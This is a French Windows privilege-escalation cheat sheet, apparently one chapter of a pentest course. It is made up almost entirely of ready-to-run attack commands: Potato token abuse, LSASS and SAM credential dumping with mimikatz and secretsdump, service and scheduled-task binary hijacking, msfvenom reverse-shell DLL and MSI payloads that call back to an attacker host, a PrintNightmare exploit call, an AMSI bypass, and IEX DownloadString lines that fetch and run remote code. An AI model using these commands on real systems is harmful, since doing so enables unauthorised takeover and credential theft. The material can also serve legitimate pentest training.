# 26 — Windows Privilege Escalation

## Objectifs
Passer d'un utilisateur standard à Administrator / SYSTEM : énumération, tokens, services, UAC, credentials, AD local.

---

## 1. Énumération

```cmd
whoami /all
whoami /priv
whoami /groups
systeminfo
hostname
net user
net localgroup
net localgroup administrators
net share
route print
arp -a
ipconfig /all
tasklist /svc
wmic product get name,version
wmic service list brief
schtasks /query /fo LIST /v
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

```powershell
# PowerShell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-Service
Get-Process
Get-ScheduledTask
Get-ChildItem C:\ -Recurse -Include *.txt,*.conf,*.xml -ErrorAction SilentlyContinue
```

### Outils automatiques
```powershell
# WinPEAS
.\winPEASx64.exe
.\winPEASx64.exe log=winpeas.txt

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe audit
```

```cmd
:: winPEAS via PowerShell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/winPEASx64.exe')"
```

---

## 2. Tokens & privilèges

```cmd
whoami /priv
```

| Privilège | Exploitation |
|---|---|
| `SeImpersonatePrivilege` | PrintSpoofer, JuicyPotato, RoguePotato, GodPotato |
| `SeAssignPrimaryToken` | Potato |
| `SeBackupPrivilege` | copier SAM/SYSTEM |
| `SeRestorePrivilege` | écrire des fichiers système |
| `SeTakeOwnershipPrivilege` | prendre possession |
| `SeDebugPrivilege` | dump LSASS |
| `SeLoadDriverPrivilege` | driver malveillant |
| `SeManageVolumePrivilege` | accès disque |

### SeImpersonate — PrintSpoofer
```cmd
PrintSpoofer64.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
```

### SeBackupPrivilege
```cmd
robocopy /b C:\Windows\System32\config C:\Temp sam
reg save HKLM\SAM C:\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Temp\system.hiv
# Puis secretsdump hors ligne
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

### SeDebugPrivilege
```cmd
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# Puis mimikatz : sekurlsa::minidump lsass.dmp
```

---

## 3. Services

### Chemins non quotés
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
```
```cmd
# C:\Program Files\Vuln Service\service.exe
# → créer C:\Program.exe ou C:\Program Files\Vuln.exe
```

### Permissions faibles
```cmd
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Users" *
# SERVICE_ALL_ACCESS / SERVICE_CHANGE_CONFIG → modifier le binaire
sc config <SERVICE> binPath= "C:\Temp\shell.exe"
sc stop <SERVICE> && sc start <SERVICE>
```

```powershell
# PowerUp
Get-ModifiableService
Get-ModifiableServiceFile
Invoke-ServiceAbuse -Name <SERVICE> -Command "net localgroup administrators <USER> /add"
```

### DLL hijacking
```cmd
# Service charge une DLL manquante depuis un dossier writable
# Trouver avec Process Monitor (filtre PATH NOT FOUND)
# Compiler une DLL malveillante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f dll -o hijack.dll
```

### Unquoted service path
```cmd
sc qc <SERVICE>
# BINARY_PATH_NAME : C:\Program Files\My App\service.exe (sans quotes)
# Créer C:\Program.exe, C:\Program Files\My.exe, etc.
```

---

## 4. UAC bypass

```cmd
whoami /groups | findstr /i "Mandatory"
# Medium → High possible si admin local mais UAC actif

# Auto-elevate binaries
# fodhelper.exe, computerdefaults.exe, sdclt.exe
# UACME
UACME.exe 23
```

Vérifier `EnableLUA` :
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

---

## 5. AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Si les deux = 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i C:\Temp\shell.msi
```

---

## 6. Credentials

```cmd
# Fichiers
dir /s /b C:\Users\*pass* C:\Users\*cred* C:\Users\*config* 2>nul
type C:\Windows\Panther\unattend.xml
type C:\Windows\System32\sysprep\unattend.xml
type C:\inetpub\wwwroot\web.config
type %APPDATA%\..\..\Unattend\Unattend.xml

# Registre
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

# cmdkey
cmdkey /list
runas /savecred /user:<DOMAIN>\<USER> cmd

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Wi-Fi
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

# Fichiers de sauvegarde
dir C:\Windows\repair\sam
```

### Mimikatz
```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
lsadump::secrets
kerberos::list /export
```

### GPP / cpassword
```cmd
findstr /S /I cpassword \\<DC>\sysvol\<DOMAIN>\Policies\*.xml
# Déchiffrer avec gpp-decrypt
gpp-decrypt <CPASSWORD>
```

---

## 7. Scheduled tasks

```cmd
schtasks /query /fo LIST /v
# Tâche exécutée par SYSTEM avec un binaire writable
icacls C:\Path\Task.exe
# Remplacer par un shell
copy /Y C:\Temp\shell.exe C:\Path\Task.exe
```

---

## 8. Kernel exploits

```cmd
systeminfo
# Missing patches
wmic qfe list brief
```

| CVE | Cible |
|---|---|
| MS17-010 | EternalBlue (SMBv1) |
| CVE-2019-0708 | BlueKeep (RDP) |
| CVE-2021-34527 | PrintNightmare |
| CVE-2020-1472 | Zerologon (DC) |
| MS16-032 | Secondary Logon |
| CVE-2016-0099 | Task Scheduler |

```bash
# Watson / Sherlock
.\Watson.exe
.\Sherlock.ps1
```

### PrintNightmare
```bash
# Vérifier
rpcdump.py @<TARGET> | grep -i "MS-RPRN\|MS-PAR"
# Exploit
python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET> '\\<LHOST>\share\shell.dll'
```

---

## 9. Évasion & exécution

```powershell
# AMSI bypass (lab)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Téléchargement en mémoire
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')

# Base64
powershell -enc <BASE64>
```

---

## 10. Checklist

- [ ] `whoami /all` + privilèges
- [ ] WinPEAS / PowerUp exécutés
- [ ] Services : chemins, permissions, DLL
- [ ] Tâches planifiées
- [ ] UAC / AlwaysInstallElevated
- [ ] Credentials (fichiers, registre, historique, cmdkey)
- [ ] Patches / kernel
- [ ] Token / SeImpersonate
- [ ] Admin/SYSTEM obtenu + preuve

## Aide-mémoire
| Situation | Outil |
|---|---|
| SeImpersonate | PrintSpoofer / GodPotato |
| Service modifiable | `sc config binPath=` |
| Chemin non quoté | binaire intermédiaire |
| AlwaysInstallElevated | `msiexec /i shell.msi` |
| Credentials | mimikatz, secretsdump, cmdkey |
| Patch manquant | Watson, searchsploit |
